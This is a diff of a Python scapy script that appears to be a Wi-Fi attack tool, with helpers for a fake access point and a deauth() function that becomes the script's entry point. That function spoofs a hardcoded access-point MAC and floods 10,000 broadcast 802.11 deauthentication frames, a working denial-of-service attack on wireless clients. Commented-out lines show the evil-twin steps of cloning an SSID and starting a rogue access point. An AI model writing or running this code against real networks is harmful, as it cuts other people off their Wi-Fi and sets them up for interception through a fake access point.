@@ -3,7 +3,7 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deau
 from scapy.layers.l2 import ARP, Ether
 from wifi import Cell, Scheme
 from scapy.all import *
-from PyAccessPoint import pyaccesspoint
+
 
 
 def chooseDevice():
@@ -15,7 +15,7 @@ def chooseDevice():
         # print(interface['netmask'])
         # print(interface['broadcast'])
         devicesName.append(interface['device'])
-    print("Choose AP creating device: ")
+    print("Choose interface: ")
     count = 1
     for device in devicesName:
         print(str(count) + '.' + device)
@@ -84,18 +84,20 @@ def stopAP():
     os.system("sudo bash fake-ap-stop.sh")
 
 
-def deauth(brdmac, addr1, addr2):
+def deauth():
+    interface = chooseDevice()
+    goMonitorMode(interface)
     brdmac = "ff:ff:ff:ff:ff:ff"
     pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = "A4:91:B1:8A:A4:46", addr3 = "A4:91:B1:8A:A4:46") / Dot11Deauth()
-    sendp(pkt, iface="wlp0s20f0u2mon", count=10000, inter=.2)
+    sendp(pkt, iface=interface, count=10000, inter=.2)
 
 if __name__ == "__main__":
-     # checkFotRoot()
-     # apDevice = chooseDevice()
-     # ssid = apRescanHandler(apDevice)
-     # startAP(ssid, apDevice)
-     #os.system('trackerjacker -i ' + apDevice + ' --map')
-
+    # checkFotRoot()
+    # apDevice = chooseDevice()
+    # ssid = apRescanHandler(apDevice)
+    # startAP(ssid, apDevice)
+    #os.system('trackerjacker -i ' + apDevice + ' --map')
+    deauth()
 
 
 
